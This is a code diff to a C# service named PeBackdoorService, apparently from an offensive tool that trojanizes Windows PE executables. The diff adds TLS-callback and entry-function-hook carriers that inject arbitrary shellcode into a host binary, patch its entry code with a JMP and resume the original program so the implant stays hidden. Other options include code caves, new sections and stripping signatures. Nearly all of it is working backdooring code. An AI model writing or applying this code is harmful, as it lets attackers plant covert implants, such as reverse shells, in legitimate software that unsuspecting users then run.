@@ -284,13 +284,42 @@ public sealed class PeBackdoorService
             if (options.Mode == BackdoorMode.Normal)
                 result.Warnings.Add("Normal mode: host binary and implant both execute on every launch — incompatible with persistence snippets.");
 
+            bool isTlsCarrier = options.CarrierInvoke == CarrierInvoke.TlsCallback;
+            bool isFunctionBackdoor = options.CarrierInvoke == CarrierInvoke.EntryFunctionBackdoor;
+
+            // For function backdoor: capture the original 5 bytes at the entry point
+            // BEFORE any modification so we can embed them in the carrier as a trampoline.
+            byte[]? originalEntryBytes = null;
+            if (isFunctionBackdoor && pe.Is64Bit && options.Encryption == PayloadEncryption.None)
+            {
+                originalEntryBytes = new byte[5];
+                Array.Copy(peData, pe.EntryPointCodeFileOffset, originalEntryBytes, 0, 5);
+                result.Steps.Add($"Saved original entry bytes: {string.Join(" ", originalEntryBytes.Select(b => b.ToString("X2")))}");
+            }
+
             // Use threaded payload (CreateThread) for x64 to handle shellcode that
             // calls ExitProcess or never returns (reverse shells, etc).
             // Silence mode uses a command-line check to suppress the host when args are present.
             // Falls back to inline CALL for x86.
             int jmpOffsetInPayload;
             byte[] fullPayload;
-            if (pe.Is64Bit && options.Encryption == PayloadEncryption.None)
+            if (isTlsCarrier)
+            {
+                // TLS carrier: payload must RETURN (C3) so the loader can call OEP afterwards
+                fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload, tlsMode: true);
+                int stubOverhead = fullPayload.Length - payload.Length;
+                result.Steps.Add($"Built TLS callback payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
+            }
+            else if (isFunctionBackdoor && originalEntryBytes != null)
+            {
+                // Function backdoor: append original 5 entry bytes before the JMP so they
+                // are re-executed in place of the patched entry, then JMP to OEP+5.
+                fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload,
+                    extraBeforeTerminator: originalEntryBytes);
+                int stubOverhead = fullPayload.Length - payload.Length;
+                result.Steps.Add($"Built function-backdoor payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub, {originalEntryBytes.Length} trampoline bytes)");
+            }
+            else if (pe.Is64Bit && options.Encryption == PayloadEncryption.None)
             {
                 if (options.Mode == BackdoorMode.Silence)
                 {
@@ -316,43 +345,76 @@ public sealed class PeBackdoorService
 
             // ── Inject ───────────────────────────────────────────────
             uint payloadRva;
-            switch (options.Method)
+            // TLS carrier always uses TLS injection regardless of the selected method,
+            // because it needs a full TLS directory + callback array set up.
+            if (isTlsCarrier)
             {
-                case InjectionMethod.CodeCave:
-                    (peData, payloadRva) = InjectCodeCave(peData, pe, fullPayload, result);
-                    break;
-                case InjectionMethod.NewSection:
-                    (peData, payloadRva) = InjectNewSection(peData, pe, fullPayload, options.NewSectionName, result);
-                    // Re-parse after structural change
-                    pe = ParsePe(peData);
-                    break;
-                case InjectionMethod.SectionExtension:
-                    (peData, payloadRva) = InjectSectionExtension(peData, pe, fullPayload, result);
-                    pe = ParsePe(peData);
-                    break;
-                case InjectionMethod.TextSectionPadding:
-                    (peData, payloadRva) = InjectTextSectionPadding(peData, pe, fullPayload, result);
-                    break;
-                case InjectionMethod.TlsCallback:
-                    (peData, payloadRva) = InjectViaTlsCallback(peData, pe, fullPayload, options.NewSectionName, result);
-                    pe = ParsePe(peData);
-                    break;
-                default:
-                    result.ErrorMessage = $"Injection method {options.Method} is not supported";
-                    return result;
+                string tlsSectionName = string.IsNullOrEmpty(options.NewSectionName) ? ".tls0" : options.NewSectionName;
+                (peData, payloadRva) = InjectViaTlsCallback(peData, pe, fullPayload, tlsSectionName, result);
+                pe = ParsePe(peData);
+            }
+            else
+            {
+                switch (options.Method)
+                {
+                    case InjectionMethod.CodeCave:
+                        (peData, payloadRva) = InjectCodeCave(peData, pe, fullPayload, result);
+                        break;
+                    case InjectionMethod.NewSection:
+                        (peData, payloadRva) = InjectNewSection(peData, pe, fullPayload, options.NewSectionName, result);
+                        // Re-parse after structural change
+                        pe = ParsePe(peData);
+                        break;
+                    case InjectionMethod.SectionExtension:
+                        (peData, payloadRva) = InjectSectionExtension(peData, pe, fullPayload, result);
+                        pe = ParsePe(peData);
+                        break;
+                    case InjectionMethod.TextSectionPadding:
+                        (peData, payloadRva) = InjectTextSectionPadding(peData, pe, fullPayload, result);
+                        break;
+                    case InjectionMethod.TlsCallback:
+                        (peData, payloadRva) = InjectViaTlsCallback(peData, pe, fullPayload, options.NewSectionName, result);
+                        pe = ParsePe(peData);
+                        break;
+                    default:
+                        result.ErrorMessage = $"Injection method {options.Method} is not supported";
+                        return result;
+                }
             }
 
             result.ShellcodeAddress = payloadRva;
             result.CarrierAddress = payloadRva;
 
-            // ── Patch JMP offset at end of payload to original OEP ──
-            peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffsetInPayload);
-            result.Steps.Add($"Patched resume JMP → original entry point 0x{pe.AddressOfEntryPoint:X}");
+            // ── Carrier-specific post-injection patching ─────────────
+            if (isTlsCarrier)
+            {
+                // TLS callback: payload ends with RET (C3), so no JMP to patch.
+                // PE header entry point is intentionally left unchanged — the loader
+                // runs TLS callbacks before calling OEP, so OEP fires on its own.
+                result.Steps.Add($"TLS callback installed: payload at RVA 0x{payloadRva:X}, OEP preserved at 0x{pe.AddressOfEntryPoint:X}");
+                _logger.Info($"TLS carrier: payload at RVA 0x{payloadRva:X}, OEP 0x{pe.AddressOfEntryPoint:X} unchanged");
+            }
+            else if (isFunctionBackdoor)
+            {
+                // Function backdoor: patch JMP in payload to OEP+5 (skipping the 5 bytes
+                // we overwrote with our own JMP), then patch those 5 entry bytes → JMP carrier.
+                uint resumeRva = pe.AddressOfEntryPoint + 5;
+                peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffsetInPayload, resumeRva);
+                result.Steps.Add($"Patched resume JMP → OEP+5 (0x{resumeRva:X})");
 
-            // ── Hijack entry point ───────────────────────────────────
-            peData = PatchEntryPointField(peData, pe, payloadRva);
-            result.Steps.Add($"Entry point: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
-            _logger.Info($"Entry point changed: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
+                peData = PatchEntryFunctionWithJmp(peData, pe, payloadRva, result);
+            }
+            else
+            {
+                // EntryPointHijack / DllMain: standard path — patch JMP to OEP and
+                // redirect AddressOfEntryPoint to the carrier.
+                peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffsetInPayload);
+                result.Steps.Add($"Patched resume JMP → original entry point 0x{pe.AddressOfEntryPoint:X}");
+
+                peData = PatchEntryPointField(peData, pe, payloadRva);
+                result.Steps.Add($"Entry point: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
+                _logger.Info($"Entry point changed: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
+            }
 
             // ── Post-processing ──────────────────────────────────────
             if (options.RemoveSignature && pe.HasSignature)
@@ -375,7 +437,8 @@ public sealed class PeBackdoorService
             try
             {
                 var verifyPe = ParsePe(peData);
-                if (verifyPe.AddressOfEntryPoint != payloadRva)
+                // TLS carrier and function backdoor intentionally leave OEP unchanged
+                if (!isTlsCarrier && !isFunctionBackdoor && verifyPe.AddressOfEntryPoint != payloadRva)
                     result.Warnings.Add($"Verification: entry point mismatch (expected 0x{payloadRva:X}, got 0x{verifyPe.AddressOfEntryPoint:X})");
             }
             catch (Exception ex)
@@ -687,7 +750,8 @@ public sealed class PeBackdoorService
      /// The JMP offset is set to 0 and must be patched after placement.
      /// x64 only — falls back to inline payload for x86.
      /// </summary>
-    private byte[] BuildThreadedPayload(byte[] shellcode, bool is64Bit, out int jmpOffsetInPayload)
+    private byte[] BuildThreadedPayload(byte[] shellcode, bool is64Bit, out int jmpOffsetInPayload,
+        bool tlsMode = false, byte[]? extraBeforeTerminator = null)
     {
         if (!is64Bit)
         {
@@ -778,10 +842,21 @@ public sealed class PeBackdoorService
         // ═══ [Restore registers] ════════════════════════════════════════
         buf.AddRange(X64RestoreRegs); // 28 bytes
 
-        // ═══ [JMP original entry point] ═════════════════════════════════
+        // ═══ [Extra bytes before terminator (e.g. function-backdoor trampoline)] ═══
+        if (extraBeforeTerminator != null)
+            buf.AddRange(extraBeforeTerminator);
+
+        // ═══ [JMP original entry point] or [RET for TLS carrier] ════════
         int jmpOepPos = buf.Count;
-        buf.Add(0xE9);
-        buf.AddRange(new byte[4]); // placeholder — patched by PatchPayloadJmpOffset
+        if (tlsMode)
+        {
+            buf.Add(0xC3); // RET — return to TLS callback dispatcher; loader calls OEP separately
+        }
+        else
+        {
+            buf.Add(0xE9);
+            buf.AddRange(new byte[4]); // placeholder — patched by PatchPayloadJmpOffset
+        }
 
         // ═══ [Shellcode] ════════════════════════════════════════════════
         int shellcodePos = buf.Count;
@@ -808,12 +883,9 @@ public sealed class PeBackdoorService
         int leaDisp = shellcodePos - (leaR8Pos + 7);
         BitConverter.GetBytes(leaDisp).CopyTo(bytes, leaR8Pos + 3);
 
-        jmpOffsetInPayload = jmpOepPos;
+        jmpOffsetInPayload = tlsMode ? -1 : jmpOepPos;
         return bytes;
     }
-
-    // ─────────────────────────────────────────────────────────────────────
-    //  BuildSilencePayload — Silence mode (x64 only)
     //
     //  Layout: [prologue: cmdline space-scan] [normal_path: CreateThread stub]
     //          [EB → JMP_OEP] [silence_path: call shellcode + spin]
@@ -1658,7 +1730,7 @@ public sealed class PeBackdoorService
     /// When jmpOffsetHint >= 0, use it directly. Otherwise auto-detect from inline payload layout.
     /// </summary>
     private byte[] PatchPayloadJmpOffset(byte[] peData, ParsedPe pe, int payloadLen, uint payloadRva,
-                                          int jmpOffsetHint = -1)
+                                          int jmpOffsetHint = -1, uint resumeRva = 0)
     {
         long payloadFileOffset = RvaToFileOffset(payloadRva, pe.Sections);
         int pos;
@@ -1709,7 +1781,8 @@ public sealed class PeBackdoorService
 
         // Calculate relative offset: target - (jmp_rva + 5)
         uint jmpRva = payloadRva + (uint)pos;
-        int relOffset = (int)pe.AddressOfEntryPoint - (int)(jmpRva + 5);
+        uint targetRva = resumeRva != 0 ? resumeRva : pe.AddressOfEntryPoint;
+        int relOffset = (int)targetRva - (int)(jmpRva + 5);
 
         var output = peData.ToArray();
         BitConverter.GetBytes(relOffset).CopyTo(output, jmpFileOffset + 1);
@@ -2035,6 +2108,27 @@ public sealed class PeBackdoorService
         return output;
     }
 
+    /// <summary>
+    /// Patches the first 5 bytes of the entry function with a near JMP to the carrier payload.
+    /// The PE header's AddressOfEntryPoint is left unchanged — the carrier is reached via the
+    /// function body hook, not by a header field change.
+    /// </summary>
+    private byte[] PatchEntryFunctionWithJmp(byte[] peData, ParsedPe pe, uint carrierRva, BackdoorResult result)
+    {
+        var output = peData.ToArray();
+        long entryFileOffset = pe.EntryPointCodeFileOffset;
+
+        // JMP rel32 displacement is relative to the next instruction (OEP + 5)
+        int jmpRel = (int)carrierRva - (int)(pe.AddressOfEntryPoint + 5);
+
+        output[entryFileOffset] = 0xE9; // JMP rel32
+        BitConverter.GetBytes(jmpRel).CopyTo(output, entryFileOffset + 1);
+
+        result.Steps.Add($"Entry function patched at file offset 0x{entryFileOffset:X}: first 5 bytes → JMP carrier 0x{carrierRva:X}");
+        _logger.Info($"Entry function code patched: JMP 0x{carrierRva:X} at file offset 0x{entryFileOffset:X}");
+        return output;
+    }
+
     private byte[] PatchSectionCharacteristics(byte[] peData, SectionEntry section, uint newChars)
     {
         var output = peData.ToArray();
@@ -2208,10 +2302,25 @@ public sealed class PeBackdoorService
         if (options.Encryption != PayloadEncryption.None)
             issues.Add("BLOCK: Backdoor-stage encryption/encoding is not supported. Prepare a compatible flat .bin externally, then inject it with encryption set to None.");
 
-        if (options.CarrierInvoke != CarrierInvoke.EntryPointHijack)
-            issues.Add($"BLOCK: Carrier '{options.CarrierInvoke}' is not implemented. Only entry-point hijack is currently supported.");
+        // Carrier-specific validation
+        switch (options.CarrierInvoke)
+        {
+            case CarrierInvoke.EntryFunctionBackdoor:
+                if (!pe.Is64Bit)
+                    issues.Add("BLOCK: Entry Function Backdoor carrier requires an x64 target PE.");
+                break;
+            case CarrierInvoke.TlsCallback:
+                if (!pe.Is64Bit)
+                    issues.Add("BLOCK: TLS Callback carrier requires an x64 target PE.");
+                break;
+            case CarrierInvoke.DllMain:
+                if (!pe.IsDll)
+                    issues.Add("BLOCK: DllMain Hook carrier is only applicable to DLL targets. Use Entry Point Hijack for EXE files.");
+                break;
+        }
 
-        if (!options.PreserveOriginalEntry)
+        // PreserveOriginalEntry=false is not supported (except for TLS where it is N/A)
+        if (!options.PreserveOriginalEntry && options.CarrierInvoke != CarrierInvoke.TlsCallback)
             issues.Add("BLOCK: Disabling original entry-point preservation is not implemented. The current carrier always resumes the original entry point.");
 
         if (pe.IsDotNet)
